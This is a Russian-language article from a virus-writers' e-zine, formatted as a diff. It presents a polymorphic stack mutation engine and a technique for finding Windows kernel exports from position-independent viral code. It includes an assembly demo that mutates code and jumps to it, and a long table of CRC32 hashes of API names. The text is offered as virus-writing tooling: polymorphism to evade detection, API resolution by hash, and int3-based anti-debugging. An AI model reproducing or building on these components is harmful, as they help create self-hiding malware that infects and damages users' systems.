@@ -1,0 +1,2556 @@
+- [Duke's Virus Labs #10] - [Page 19] -
+
+Stack Mutation Engine DINA v2.2      
+(c) by Voodoo/SMF
+
+
+   Сразу следует сказать, что данная статья уже публиковалась в TD. 
+Отличием является апдейтченые : KERN32VX.inc и DINAV2.inc. 
+KERN32VX.inc - модуль позволяющий работать с экспортами  через 
+простую команду db 0cch. DINAV2.inc - полиморфный движок описанный в TD032000.
+   Речь пойдет о импорте функций из кернела для "переносимого кода". 
+Обычно импорт в "переносимом коде" происходит следующим способом: 
+получаем точку входа, по ней находим MZ заголовок, далее находим PE заголовок,
+там находим импорты кернела, по ним находим MZ заголовок кернела, далее PE 
+заголовок, и наконец добираемся до таблицы экспортов  откуда сохраняем 
+адреса нужных API. Во всяком случае этим алгоритмом пользовался я сам когда 
+ваял Win32.Magic.1590. Написав DINA v2.0 я вспомнил о импорте. Когда код 
+выполняется в стеке этот алгоритм уже не работает ("код" запускается вне 
+приложения которое импортирует кернел).
+   Существуют  и другие методы ипорта. Так  было предложено использовать SEH,
+точнее последний указатель на обработчик исключения. Обычно (если прога его 
+не переназначила) он находится внутри кернела, т.е. можно найти сразу MZ 
+кернела. Этот метод применим в "коде" который получает управление первым.
+Если "код" получает управление методом OEP, то нет гарантии что к моменту 
+получения управления "final" exception handler будет находиться в кернеле. 
+Хотя, если учесть этот факт, можно наряду с MZ кернела  искать и MZ приложения.
+   Еще одна вариация на тему SEH и импорты. При возникновении исключения 
+получает управление первый обработчик. Он разбирает исключение и если он 
+его не обрабатывает  выполняются следующий код:
+    MOV EAX,1
+    RET
+Это передача управления на следующий по цепочке обработчик. И так будет 
+продолжаться до "final" exception handler. Он уже выведет сообщение 
+типа "Программа выполнила коректную операцию и будет выгружена".Если какой 
+либо обработчик исправит аварийную ситуацию, выполняются следующий код:
+    MOV EAX,0
+    RET
+Что значит :reload context & continue execution.
+После исключения ss:[eps]= адрес процедуры которая определяет что делать:
+"выполнять" или "выгружать". Этими привилегиями обладает операционная система.
+В NT она (процедура) лежит в NTDLL.dll, в МД - в KERNELL32.dll. Идея в том 
+чтобы взять этот адрес за точку входа и двигаясь по уменьшению искать MZ. 
+При этом следует проверять имя длл`ки. В интишке за KERNEL32.dll следует 
+NTDLL.dll поэтому  после NTDLL мы найдем KERNEL32. Не знаю как дело обстоит 
+в WIN2k, но думаю что "кто ищет тот всегда находит".Последний алгоритм был 
+реализован в процедуре GetKernelHandlerA в файле kernvx32.inc. Она в EDI 
+возвращает смещение на MZ кернела (Image Base VA). Процедура KernVx32Init в 
+том же kernvx32.inc настраивает механизм импорта через SEH. Ее параметром 
+является регистр EDI в котором должен находится оффсет на MZ длл`ки. Далее 
+мы просто пушим параметры API, пушим APINAMECRC32 и пишем EXEPTION. 
+EXEPTION - это переменная в файле exeption.inc. Она может принимать 
+два значения: DEBUG и NODEBUG. В случае NODEBUG исключение вызывается с 
+помощью db 0cch что затрудняет отладку. В случае DEBUG исключение вызывается 
+с помощью  db 0ffh,0ffh,0ffh,0c3h,90h,90h,90h (хотя достаточно dw 0ffffh). 
+Если APINAMECRC32 найдена в длл`ке (для которой  проинстален KernVx32), то 
+выполняется API иначе EAX=-1.  Для смены DLL следует выполнить код типа:
+ call LockDLLName
+ db 'NEWDLLNAME.dll',0
+ LockDLLName:
+ callEx GetModuleHandlerA
+ xor edx,edx                    ;
+ pop dword ptr fs:[edx]         ; 
+ pop edx                        ;  
+ mov edi,eax 
+ call KernVx32Init
+Более подробно применение показано в примере kernvx32.asm 
+PS.
+Интересно как енто будет работать под win2k 
+PPS. 
+Работает и в win2k ... что и следовало ожидать.
+
+===== begin kernvx32.asm =====
+.386p
+.model flat
+include exeption.inc
+.DATA
+include dinav2.inc
+db '(c) Voodoo//SMF 07.07.2000'
+extrn   MessageBeep:PROC  ; Только лишь для того чтобы прога запускалась.
+                          ; Без импoртов прога не запускаетя и тд32 глючит.
+;-----------------------------------------------------------------------------
+MyCode:
+; Сюда передаёт управление DINA v2.2
+; Код работает в стеке.
+           call @MyCodeL1
+@Hello:      db 'Hello from stack !!!',0
+@MyCodeL1:   pop ebx
+
+             xor edi,edi            ;
+             call Kern32VxInit      ; Инициализация VX кернела (KERNEL32.dll)
+
+             ; Получим  User32Hahdler
+             call LpL
+@UserName    db 'USER32.dll',0
+LpL:
+             callEx GetModuleHandleA ; Вызов GetModuleHandleA
+                                     ; в стеке offset на USER32.DLL
+             mov edi,eax             ; edi=ImageBaseVA of User32.dll
+             ;-------------
+             xor eax,eax             ; Возврат пре ведущего обработчика SEH
+             pop dword ptr  fs:[eax] ;
+             pop eax                 ;
+             ;-------------
+             call Kern32VxInit ; Инициализация VX кернела но для User32.dll
+
+             push 0
+             push ebx
+             push ebx
+             push 0
+             callEx MessageBoxA
+            ;-------------
+             xor eax,eax
+             pop dword ptr  fs:[eax]
+             pop eax
+            ;-------------
+             xor edi,edi
+             call Kern32VxInit   ; Инициализация VX кернела для KERNEL32.dll
+
+             push 0              ; Выход из проги.
+             callEx ExitProcess
+;-----------------------------------------------------------------------------
+include kern32vx.inc
+;-----------------------------------------------------------------------------
+EndMyCode:
+.data?
+buffer db 1024 dup(?)
+.CODE
+MyCodeSize equ offset EndMyCode- offset MyCode
+KernVX32:
+    mov eax,MyCodeSize
+    xor edi,edi
+    call Kern32VxInit      ; Инициализация VX кернела (KERNEL32.dll)
+   ;--------------------
+   ; Делаем Randomaze
+    push offset buffer
+    callEx GetSystemTime  ; Вызов GetSystemTime
+    mov RandSeed,eax
+   ;-----------------
+   ; Выделяем память для генерации кода
+    push MyCodeSize*10 ; K<=10
+    push 0
+    callEx GlobalAlloc
+    push eax
+    callEx GlobalLock
+    ;-------------------
+    mov edi,eax            ;edi=Смещение на наш буфер
+    mov esi,offset MyCode  ;esi=Наш код каторый мы "полиморфим"
+    mov ecx,MyCodeSize     ;ecx=Его размер
+    xor edx,edx            ;edx=Смещение на первую команду  
+    push 00050005h         ;DWORD=(WORD NopsMaxCount, WORD MycopMaxCount)  
+    call MakePolyImg       ;На выходе eax=Размер сгенерированного кода
+    ;--------------------
+    xor eax,eax  ; Анинсталим VX кернел
+    pop dword ptr fs:[eax] ;
+    pop eax      ;
+    jmp edi      ; Отдаем управление сгенерированному коду.
+                 ;
+    push 0
+    callEx ExitProcess
+exit_:
+Ends
+End KernVX32
+===== end   kernvx32.asm =====
+
+===== begin crc32.inc =====
+zKERNEL32dll					 EQU 0B0966F54h
+zAddAtomA					 EQU 0D3F6EDBEh
+zAddAtomW					 EQU 0E9F6EDBEh
+zAddConsoleAliasA				 EQU 0032616F2h
+zAddConsoleAliasW				 EQU 0192616F2h
+zAllocConsole					 EQU 0A8AFAF7Eh
+zAreFileApisANSI				 EQU 03C587766h
+zBackupRead					 EQU 0CECDCDA8h
+zBackupSeek					 EQU 0DAD2CEA9h
+zBackupWrite					 EQU 05E5C491Fh
+zBaseAttachCompleteThunk			 EQU 0050CFFC5h
+zBeep     			   		 EQU 070656542h
+zBeginUpdateResourceA				 EQU 0C9EFEFC8h
+zBeginUpdateResourceW				 EQU 0DFEFEFC8h
+zBuildCommDCBA					 EQU 06991C4C0h
+zBuildCommDCBAndTimeoutsA			 EQU 0DB0304CBh
+zBuildCommDCBAndTimeoutsW			 EQU 0F10304CBh
+zBuildCommDCBW					 EQU 07F91C4C0h
+zCallNamedPipeA					 EQU 0244F4B1Ah
+zCallNamedPipeW					 EQU 03A4F4B1Ah
+zCancelIo					 EQU 0EDED04DAh
+zCancelWaitableTimer				 EQU 064605C2Ch
+zClearCommBreak					 EQU 048424D27h
+zClearCommError					 EQU 06D605D2Ah
+zCloseConsoleHandle				 EQU 0FD0706E0h
+zCloseHandle					 EQU 02731310Dh
+zCloseProfileUserMapping			 EQU 01C2421F4h
+zCmdBatNotification	 			 EQU 003F9F7CCh
+zCommConfigDialogA				 EQU 059858D5Ch
+zCommConfigDialogW				 EQU 06F858D5Ch
+zCompareFileTime				 EQU 0BBC3C59Bh
+zCompareStringA					 EQU 064909869h
+zCompareStringW					 EQU 07A909869h
+zConnectNamedPipe				 EQU 0222B29FFh
+zConsoleMenuControl				 EQU 02F3130FCh
+zContinueDebugEvent				 EQU 0140E0EE7h
+zConvertDefaultLocale				 EQU 0DCE5E8C4h
+zConvertThreadToFiber				 EQU 0CAC6D0ABh
+zCopyFileA			    		 EQU 03C6B754Ah
+zCopyFileExA					 EQU 0FA29201Bh
+zCopyFileExW					 EQU 01029201Bh
+zCopyFileW					 EQU 0526B754Ah
+zCreateConsoleScreenBuffer			 EQU 0CFC2CFA4h
+zCreateDirectoryA				 EQU 03559521Eh
+zCreateDirectoryExA				 EQU 0F3171109h
+zCreateDirectoryExW				 EQU 009171109h
+zCreateDirectoryW				 EQU 04B59521Eh
+zCreateEventA				         EQU 080A4A274h
+zCreateEventW					 EQU 096A4A274h
+zCreateFiber					 EQU 025182503h
+zCreateFileA					 EQU 0FE222F03h
+zCreateFileMappingA				 EQU 0CCF0FBCBh
+zCreateFileMappingW				 EQU 0E2F0FBCBh
+zCreateFileW					 EQU 014222F03h
+zCreateIoCompletionPort				 EQU 0B8A9A976h
+zCreateMailslotA				 EQU 0C4E8E6B6h
+zCreateMailslotW				 EQU 0DAE8E6B6h
+zCreateMutexA					 EQU 091B5AF8Ah
+zCreateMutexW					 EQU 0A7B5AF8Ah
+zCreateNamedPipeA				 EQU 0F31723F2h
+zCreateNamedPipeW				 EQU 0091723F2h
+zCreatePipe					 EQU 0CACACCA4h
+zCreateProcessA					 EQU 05E82814Dh
+zCreateProcessW					 EQU 07482814Dh
+zCreateRemoteThread				 EQU 0040515EEh
+zCreateSemaphoreA				 EQU 024485521h
+zCreateSemaphoreW				 EQU 03A485521h
+zCreateTapePartition				 EQU 0847B7E52h
+zCreateThread					 EQU 09596A782h
+zCreateVirtualBuffer				 EQU 081748158h
+zCreateWaitableTimerA				 EQU 0ABCFCFA7h
+zCreateWaitableTimerW				 EQU 0C1CFCFA7h
+zDebugActiveProcess				 EQU 01D0BFDD7h
+zDebugBreak					 EQU 0C3BABE9Bh
+zDefineDosDeviceA				 EQU 0F81D1CF9h
+zDefineDosDeviceW				 EQU 00E1D1CF9h
+zDeleteAtom				 	 EQU 0D1D0C694h
+zDeleteCriticalSection				 EQU 04543390Dh
+zNTDLLRtlDeleteCriticalSection			 EQU 0552B0FEBh
+zDeleteFiber					 EQU 029232302h
+zDeleteFileA					 EQU 0022D2D02h
+zDeleteFileW					 EQU 0182D2D02h
+zDeviceIoControl				 EQU 0CED8CE9Ch
+zDisableThreadLibraryCalls			 EQU 0B8B8B585h
+zDisconnectNamedPipe				 EQU 063716A3Fh
+zDosDateTimeToFileTime				 EQU 0E5F3F5CAh
+zDuplicateConsoleHandle				 EQU 098A3AC85h
+zDuplicateHandle				 EQU 0C2CDD6B2h
+zEndUpdateResourceA				 EQU 0F2151DFAh
+zEndUpdateResourceW				 EQU 008151DFAh
+zEnterCriticalSection				 EQU 0DDE3E2B8h
+zNTDLLRtlEnterCriticalSection			 EQU 0FFD5BA96h
+zEnumCalendarInfoA				 EQU 0598D8C66h
+zEnumCalendarInfoW				 EQU 06F8D8C66h
+zEnumDateFormatsA				 EQU 00D413C08h
+zEnumDateFormatsW				 EQU 023413C08h
+zEnumResourceLanguagesA				 EQU 094C8C39Ch
+zEnumResourceLanguagesW				 EQU 0AAC8C39Ch
+zEnumResourceNamesA				 EQU 0F0241EF9h
+zEnumResourceNamesW				 EQU 006241EF9h
+zEnumResourceTypesA				 EQU 01145401Ah
+zEnumResourceTypesW				 EQU 02745401Ah
+zEnumSystemCodePagesA				 EQU 0A4D8D3ADh
+zEnumSystemCodePagesW				 EQU 0BAD8D3ADh
+zEnumSystemLocalesA				 EQU 0FC302B05h
+zEnumSystemLocalesW				 EQU 012302B05h
+zEnumTimeFormatsA				 EQU 01E524D19h
+zEnumTimeFormatsW				 EQU 034524D19h
+zEraseTape				 	 EQU 064606244h
+zEscapeCommFunction				 EQU 00E0306DDh
+zExitProcess					 EQU 0564C512Eh
+zExitThread					 EQU 0CED3EAC8h
+zExitVDM					 EQU 05C78AC9Ah
+zExpandEnvironmentStringsA			 EQU 0FC2B3005h
+zExpandEnvironmentStringsW			 EQU 0122B3005h
+zExpungeConsoleCommandHistoryA			 EQU 07EADAC75h
+zExpungeConsoleCommandHistoryW			 EQU 094ADAC75h
+zExtendVirtualBuffer				 EQU 07E80936Ch
+zFatalAppExitA					 EQU 0CCFFECC6h
+zFatalAppExitW					 EQU 0E2FFECC6h
+zFatalExit					 EQU 06969612Dh
+zFileTimeToDosDateTime				 EQU 0F0F7F3CAh
+zFileTimeToLocalFileTime			 EQU 0B8BFBB91h
+zFileTimeToSystemTime				 EQU 0D1D8D4ABh
+zFillConsoleOutputAttribute			 EQU 08D948951h
+zFillConsoleOutputCharacterA			 EQU 0A7D2C9A1h
+zFillConsoleOutputCharacterW			 EQU 0BDD2C9A1h
+zFindAtomA					 EQU 038656136h
+zFindAtomW					 EQU 04E656136h
+zFindClose					 EQU 05C655B30h
+zFindCloseChangeNotification			 EQU 090908A5Eh
+zFindFirstChangeNotificationA			 EQU 0E4110BD9h
+zFindFirstChangeNotificationW			 EQU 0FA110BD9h
+zFindFirstFileA					 EQU 0315E6238h
+zFindFirstFileExA				 EQU 0EF1C0D09h
+zFindFirstFileExW				 EQU 0051C0D09h
+zFindFirstFileW					 EQU 0475E6238h
+zFindNextChangeNotification			 EQU 039393307h
+zFindNextFileA					 EQU 0C7F4F8CFh
+zFindNextFileW					 EQU 0DDF4F8CFh
+zFindResourceA					 EQU 0F11E2201h
+zFindResourceExA				 EQU 0AEDBCCC9h
+zFindResourceExW				 EQU 0C4DBCCC9h
+zFindResourceW					 EQU 0071E2201h
+zFlushConsoleInputBuffer			 EQU 020232A02h
+zFlushFileBuffers				 EQU 02D2F2905h
+zFlushInstructionCache				 EQU 058686C48h
+zFlushViewOfFile				 EQU 0AFBFBF98h
+zFoldStringA					 EQU 01F4A5227h
+zFoldStringW					 EQU 0354A5227h
+zFormatMessageA					 EQU 04C7D8762h
+zFormatMessageW					 EQU 0627D8762h
+zFreeConsole					 EQU 03B3B4115h
+zFreeEnvironmentStringsA			 EQU 02D515027h
+zFreeEnvironmentStringsW			 EQU 043515027h
+zFreeLibrary					 EQU 03D29290Bh
+zFreeLibraryAndExitThread			 EQU 047485932h
+zFreeResource					 EQU 0B0B0BF90h
+zFreeVirtualBuffer				 EQU 0AB9EAB86h
+zGenerateConsoleCtrlEvent			 EQU 0837D744Eh
+zGetACP						 EQU 0D4F91B20h
+zGetAtomNameA					 EQU 056898960h
+zGetAtomNameW					 EQU 06C898960h
+zGetBinaryType					 EQU 00B1A0ED9h
+zGetBinaryTypeA					 EQU 04C7F7F52h
+zGetBinaryTypeW					 EQU 0627F7F52h
+zGetCPInfo					 EQU 0212624FCh
+zGetCommConfig					 EQU 0E5F2EECCh
+zGetCommMask					 EQU 01B2415F9h
+zGetCommModemStatus				 EQU 00808F8C6h
+zGetCommProperties				 EQU 0BEBFBF98h
+zGetCommState					 EQU 0909F9073h
+zGetCommTimeouts				 EQU 0EAEBDCAAh
+zGetCommandLineA				 EQU 08CBFBF94h
+zGetCommandLineW				 EQU 0A2BFBF94h
+zGetCompressedFileSizeA				 EQU 078ABAB71h
+zGetCompressedFileSizeW				 EQU 08EABAB71h
+zGetComputerNameA				 EQU 01649491Eh
+zGetComputerNameW				 EQU 02C49491Eh
+zGetConsoleAliasA				 EQU 003362809h
+zGetConsoleAliasExesA				 EQU 099CCBE9Ah
+zGetConsoleAliasExesLengthA			 EQU 0FE312DF8h
+zGetConsoleAliasExesLengthW			 EQU 014312DF8h
+zGetConsoleAliasExesW				 EQU 0AFCCBE9Ah
+zGetConsoleAliasW				 EQU 019362809h
+zGetConsoleAliasesA				 EQU 0DC0F00DDh
+zGetConsoleAliasesLengthA			 EQU 04073703Bh
+zGetConsoleAliasesLengthW			 EQU 05673703Bh
+zGetConsoleAliasesW				 EQU 0F20F00DDh
+zGetConsoleCP					 EQU 0698DAF8Eh
+zGetConsoleCommandHistoryA			 EQU 0CE00ECB9h
+zGetConsoleCommandHistoryLengthA		 EQU 03265622Ah
+zGetConsoleCommandHistoryLengthW		 EQU 04865622Ah
+zGetConsoleCommandHistoryW			 EQU 0E400ECB9h
+zGetConsoleCursorInfo				 EQU 0E3E8E7BAh
+zGetConsoleDisplayMode				 EQU 035444516h
+zGetConsoleFontInfo				 EQU 0FC00FFD3h
+zGetConsoleFontSize				 EQU 00B1A04DDh
+zGetConsoleHardwareState			 EQU 00A1909E8h
+zGetConsoleInputExeNameA			 EQU 0CF0201D4h
+zGetConsoleInputExeNameW			 EQU 0E50201D4h
+zGetConsoleInputWaitHandle			 EQU 0CCDBD4AFh
+zGetConsoleKeyboardLayoutNameA			 EQU 04E818151h
+zGetConsoleKeyboardLayoutNameW			 EQU 064818151h
+zGetConsoleMode					 EQU 05C6B6C40h
+zGetConsoleOutputCP				 EQU 0FD214310h
+zGetConsoleScreenBufferInfo			 EQU 0222725F6h
+zGetConsoleTitleA				 EQU 01B4E4E24h
+zGetConsoleTitleW				 EQU 0314E4E24h
+zGetCurrencyFormatA				 EQU 0FB2E1EFFh
+zGetCurrencyFormatW				 EQU 0112E1EFFh
+zGetCurrentConsoleFont				 EQU 054544B1Ch
+zGetCurrentDirectoryA				 EQU 0E012FECDh
+zGetCurrentDirectoryW				 EQU 0F612FECDh
+zGetCurrentProcess				 EQU 0C7C8BA97h
+zGetCurrentProcessId				 EQU 07585A16Fh
+zGetCurrentThread				 EQU 040505431h
+zGetCurrentThreadId				 EQU 0EDFE19F7h
+zGetDateFormatA					 EQU 02C5F5032h
+zGetDateFormatW					 EQU 0425F5032h
+zGetDefaultCommConfigA				 EQU 0EF221FF7h
+zGetDefaultCommConfigW				 EQU 005221FF7h
+zGetDiskFreeSpaceA				 EQU 03F727251h
+zGetDiskFreeSpaceExA				 EQU 0FD301D19h
+zGetDiskFreeSpaceExW				 EQU 013301D19h
+zGetDiskFreeSpaceW				 EQU 055727251h
+zGetDriveTypeA					 EQU 0E11413E7h
+zGetDriveTypeW					 EQU 0F71413E7h
+zGetEnvironmentStrings				 EQU 086878557h
+zGetEnvironmentStringsA				 EQU 0C7FAECC5h
+zGetEnvironmentStringsW				 EQU 0DDFAECC5h
+zGetEnvironmentVariableA			 EQU 00437370Ah
+zGetEnvironmentVariableW			 EQU 01A37370Ah
+zGetExitCodeProcess				 EQU 0F9FAECC9h
+zGetExitCodeThread				 EQU 072828663h
+zGetFileAttributesA				 EQU 0EE2112EFh
+zGetFileAttributesExA				 EQU 0ABDECBC7h
+zGetFileAttributesExW				 EQU 0C1DECBC7h
+zGetFileAttributesW				 EQU 0042112EFh
+zGetFileInformationByHandle			 EQU 016251DF8h
+zGetFileSize					 EQU 01E2D17F3h
+zGetFileTime					 EQU 0122118F4h
+zGetFileType					 EQU 0253428F4h
+zGetFullPathNameA				 EQU 0E71A19EFh
+zGetFullPathNameW				 EQU 0FD1A19EFh
+zGetHandleInformation				 EQU 0D8DED4ACh
+zGetLargestConsoleWindowSize			 EQU 0C1D0BB90h
+zGetLastError					 EQU 0A1A3996Bh
+zGetLocalTime					 EQU 07D8C845Fh
+zGetLocaleInfoA					 EQU 021544A27h
+zGetLocaleInfoW					 EQU 037544A27h
+zGetLogicalDriveStringsA			 EQU 0E81B0CE5h
+zGetLogicalDriveStringsW			 EQU 0FE1B0CE5h
+zGetLogicalDrives				 EQU 02D2E2DFAh
+zGetMailslotInfo				 EQU 0D5DAD9AEh
+zGetModuleFileNameA				 EQU 0ADE0E0B5h
+zGetModuleFileNameW				 EQU 0C3E0E0B5h
+zGetModuleHandleA				 EQU 0F82B2B01h
+zGetModuleHandleW				 EQU 00E2B2B01h
+zGetNamedPipeHandleStateA			 EQU 0093C3C07h
+zGetNamedPipeHandleStateW			 EQU 01F3C3C07h
+zGetNamedPipeInfo				 EQU 0040907DCh
+zGetNextVDMCommand				 EQU 04A5A5132h
+zGetNumberFormatA				 EQU 0184B3C1Dh
+zGetNumberFormatW				 EQU 02E4B3C1Dh
+zGetNumberOfConsoleFonts			 EQU 00303F4C6h
+zGetNumberOfConsoleInputEvents			 EQU 080817241h
+zGetNumberOfConsoleMouseButtons			 EQU 0F3F4EBB9h
+zGetOEMCP					 EQU 07599BBB4h
+zGetOverlappedResult				 EQU 09797905Ch
+zGetPriorityClass				 EQU 05D5E5031h
+zGetPrivateProfileIntA				 EQU 01F524315h
+zGetPrivateProfileIntW				 EQU 035524315h
+zGetPrivateProfileSectionA			 EQU 0CAFDF4C4h
+zGetPrivateProfileSectionNamesA			 EQU 0C0F3E5BDh
+zGetPrivateProfileSectionNamesW			 EQU 0D6F3E5BDh
+zGetPrivateProfileSectionW			 EQU 0E0FDF4C4h
+zGetPrivateProfileStringA			 EQU 06C9F9D6Eh
+zGetPrivateProfileStringW			 EQU 0829F9D6Eh
+zGetPrivateProfileStructA			 EQU 07AAD9E7Ah
+zGetPrivateProfileStructW			 EQU 090AD9E7Ah
+zGetProcAddress					 EQU 05E5F512Fh
+zGetProcessAffinityMask				 EQU 0ACB5A786h
+zGetProcessHeap					 EQU 061656947h
+zGetProcessHeaps				 EQU 0D4D5CAACh
+zGetProcessPriorityBoost			 EQU 050504212h
+zGetProcessShutdownParameters			 EQU 0595A4D25h
+zGetProcessTimes				 EQU 0E5E6E6BCh
+zGetProcessVersion				 EQU 0CAD0C69Fh
+zGetProcessWorkingSetSize			 EQU 08F9E895Fh
+zGetProfileIntA					 EQU 04174653Ah
+zGetProfileIntW					 EQU 05774653Ah
+zGetProfileSectionA				 EQU 0ED2016E9h
+zGetProfileSectionW				 EQU 0032016E9h
+zGetProfileStringA				 EQU 08EC1BF93h
+zGetProfileStringW				 EQU 0A4C1BF93h
+zGetQueuedCompletionStatus			 EQU 0101100CBh
+zGetShortPathNameA				 EQU 06497976Ch
+zGetShortPathNameW				 EQU 07A97976Ch
+zGetStartupInfoA				 EQU 0C4F7EDCAh
+zGetStartupInfoW				 EQU 0DAF7EDCAh
+zGetStdHandle					 EQU 07A898262h
+zGetStringTypeA					 EQU 05E919164h
+zGetStringTypeExA				 EQU 01C4F3C39h
+zGetStringTypeExW				 EQU 0324F3C39h
+zGetStringTypeW					 EQU 074919164h
+zGetSystemDefaultLCID				 EQU 06C9CB8B6h
+zGetSystemDefaultLangID				 EQU 06090AC85h
+zGetSystemDirectoryA				 EQU 081B4A06Fh
+zGetSystemDirectoryW				 EQU 097B4A06Fh
+zGetSystemInfo					 EQU 0151A18EEh
+zGetSystemPowerStatus				 EQU 01D1E0DDAh
+zGetSystemTime					 EQU 018271EF9h
+zGetSystemTimeAdjustment			 EQU 03B3B320Ch
+zGetSystemTimeAsFileTime			 EQU 0DEEDE5BCh
+zGetTapeParameters				 EQU 0A3A49774h
+zGetTapePosition				 EQU 0E3E9DFB9h
+zGetTapeStatus					 EQU 0121302D2h
+zGetTempFileNameA				 EQU 0DD100FE5h
+zGetTempFileNameW				 EQU 0F3100FE5h
+zGetTempPathA					 EQU 0679A9767h
+zGetTempPathW					 EQU 07D9A9767h
+zGetThreadContext				 EQU 042422F0Ch
+zGetThreadLocale				 EQU 0ACBBB496h
+zGetThreadPriority				 EQU 0BFBAAB84h
+zGetThreadPriorityBoost				 EQU 0C8C8BA8Bh
+zGetThreadSelectorEntry				 EQU 0B2ADA06Ch
+zGetThreadTimes					 EQU 05E5F5F35h
+zGetTickCount					 EQU 097978E5Dh
+zGetTimeFormatA					 EQU 03D706143h
+zGetTimeFormatW					 EQU 053706143h
+zGetTimeZoneInformation				 EQU 0B8BEB48Bh
+zGetUserDefaultLCID				 EQU 085B5D1D0h
+zGetUserDefaultLangID				 EQU 079A9C59Fh
+zGetVDMCurrentDirectories			 EQU 04F505026h
+zGetVersion					 EQU 0E8EEE4C0h
+zGetVersionExA					 EQU 0E81B0806h
+zGetVersionExW					 EQU 0FE1B0806h
+zGetVolumeInformationA				 EQU 046797041h
+zGetVolumeInformationW				 EQU 05C797041h
+zGetWindowsDirectoryA				 EQU 0E81B06D5h
+zGetWindowsDirectoryW				 EQU 0FE1B06D5h
+zGlobalAddAtomA					 EQU 00E3C3B0Fh
+zGlobalAddAtomW					 EQU 0243C3B0Fh
+zGlobalAlloc					 EQU 01D2925FEh
+zGlobalCompact					 EQU 0F9F4FDE0h
+zGlobalDeleteAtom				 EQU 0181A16E5h
+zGlobalFindAtomA				 EQU 086B4B387h
+zGlobalFindAtomW				 EQU 09CB4B387h
+zGlobalFix					 EQU 0584F5251h
+zGlobalFlags					 EQU 01F1B2003h
+zGlobalFree					 EQU 0B3BDC497h
+zGlobalGetAtomNameA				 EQU 0A7D5DCB1h
+zGlobalGetAtomNameW				 EQU 0BDD5DCB1h
+zGlobalHandle					 EQU 07E888868h
+zGlobalLock					 EQU 0BABEC79Dh
+zGlobalMemoryStatus				 EQU 0322E24F2h
+zGlobalReAlloc					 EQU 0D4E0DDB5h
+zGlobalSize					 EQU 0CCD6C8A4h
+zGlobalUnWire					 EQU 08C96906Bh
+zGlobalUnfix					 EQU 03C333614h
+zGlobalUnlock					 EQU 09EA2AB80h
+zGlobalWire					 EQU 0C8D2CCA8h
+zHeapAlloc					 EQU 05D5B512Bh
+zNTDLLRtlAllocateHeap				 EQU 0A175684Bh
+zHeapCompact				         EQU 03A27290Dh
+zHeapCreate					 EQU 0C6C2B398h
+zHeapCreateTagsW				 EQU 0AEB8AA87h
+zHeapDestroy					 EQU 05D453B0Eh
+zHeapExtend					 EQU 0DAD7CEAFh
+zHeapFree					 EQU 0F3EFEFC4h
+zNTDLLRtlFreeHeap				 EQU 0FCD0C3A8h
+zHeapLock					 EQU 0FAF0F2CAh
+zHeapQueryTagW					 EQU 0FD0704E8h
+zHeapReAlloc					 EQU 0151308E2h
+zNTDLLRtlReAllocateHeap				 EQU 0592D2002h
+zHeapSize					 EQU 00D08F3D1h
+zNTDLLRtlSizeHeap				 EQU 015E9DCC1h
+zHeapSummary					 EQU 061493C20h
+zHeapUnlock					 EQU 0DED4D6ADh
+zHeapUsage					 EQU 067636146h
+zHeapValidate					 EQU 09D998A6Eh
+zHeapWalk					 EQU 000F6EFD5h
+zInitAtomTable					 EQU 0F0F4F6DAh
+zInitializeCriticalSection			 EQU 0FAF5F4CCh
+zInitializeCriticalSectionAndSpinCount		 EQU 0B5AAAA71h
+zInterlockedCompareExchange			 EQU 03C4B5224h
+zInterlockedDecrement				 EQU 0E6E6E6C4h
+zInterlockedExchange				 EQU 07281885Dh
+zInterlockedExchangeAdd				 EQU 07C8C9697h
+zInterlockedIncrement				 EQU 0F4F4F4D2h
+zInvalidateConsoleDIBits			 EQU 0CDD0CAA3h
+zIsBadCodePtr					 EQU 07949483Eh
+zIsBadHugeReadPtr				 EQU 004D4D3C8h
+zIsBadHugeWritePtr				 EQU 094646357h
+zIsBadReadPtr					 EQU 07A4A493Fh
+zIsBadStringPtrA				 EQU 0B7B8B98Ah
+zIsBadStringPtrW				 EQU 0CDB8B98Ah
+zIsBadWritePtr					 EQU 009D9D8CEh
+zIsDBCSLeadByte					 EQU 0E5C4C390h
+zIsDBCSLeadByteEx				 EQU 0A36F9D7Dh
+zIsDebuggerPresent				 EQU 0C7979C7Bh
+zIsProcessorFeaturePresent			 EQU 0260206E2h
+zIsValidCodePage				 EQU 096879377h
+zIsValidLocale					 EQU 0EDDEE5CAh
+zLCMapStringA					 EQU 08C98744Fh
+zLCMapStringW					 EQU 0A298744Fh
+zLeaveCriticalSection				 EQU 0E1D4CAA7h
+zNTDLLRtlLeaveCriticalSection			 EQU 0EEC4A985h
+zLoadLibraryA					 EQU 07D9D936Ah
+zLoadLibraryExA					 EQU 03B5B5255h
+zLoadLibraryExW					 EQU 0515B5255h
+zLoadLibraryW					 EQU 0939D936Ah
+zLoadModule					 EQU 0CCC8CBA0h
+zLoadResource					 EQU 0AFABB78Eh
+zLocalAlloc					 EQU 0BABABA98h
+zLocalCompact					 EQU 09786927Ah
+zLocalFileTimeToFileTime			 EQU 0B5B3B591h
+zLocalFlags					 EQU 0BCACB49Dh
+zLocalFree					 EQU 0514F5931h
+zLocalHandle					 EQU 01C1A1D02h
+zLocalLock					 EQU 058505C37h
+zLocalReAlloc					 EQU 07272724Fh
+zLocalShrink					 EQU 03F373818h
+zLocalSize					 EQU 06A685D3Eh
+zLocalUnlock					 EQU 03C34401Ah
+zLockFile					 EQU 0ECEAEDCFh
+zLockFileEx					 EQU 0AA95BFA4h
+zLockResource					 EQU 0B6B4C097h
+zMapViewOfFile					 EQU 0D3DED3B4h
+zMapViewOfFileEx				 EQU 09189A589h
+zMoveFileA					 EQU 0285D6746h
+zMoveFileExA					 EQU 0E61B1217h
+zMoveFileExW					 EQU 0FC1B1217h
+zMoveFileW					 EQU 03E5D6746h
+zMulDiv				        	 EQU 0241A262Eh
+zMultiByteToWideChar				 EQU 0413B4F2Eh
+zOpenConsoleW					 EQU 09BA9B494h
+zOpenEventA					 EQU 0B3D7D3B2h
+zOpenEventW					 EQU 0C9D7D3B2h
+zOpenFile					 EQU 0EFEFF3D8h
+zOpenFileMappingA				 EQU 000242D09h
+zOpenFileMappingW				 EQU 016242D09h
+zOpenMutexA					 EQU 0C4E8E0C8h
+zOpenMutexW					 EQU 0DAE8E0C8h
+zOpenProcess					 EQU 050423F26h
+zOpenProfileUserMapping				 EQU 0B1AFB190h
+zOpenSemaphoreA					 EQU 0577B865Fh
+zOpenSemaphoreW					 EQU 06D7B865Fh
+zOpenWaitableTimerA				 EQU 0DF0300E5h
+zOpenWaitableTimerW				 EQU 0F50300E5h
+zOutputDebugStringA				 EQU 0FE313F1Ah
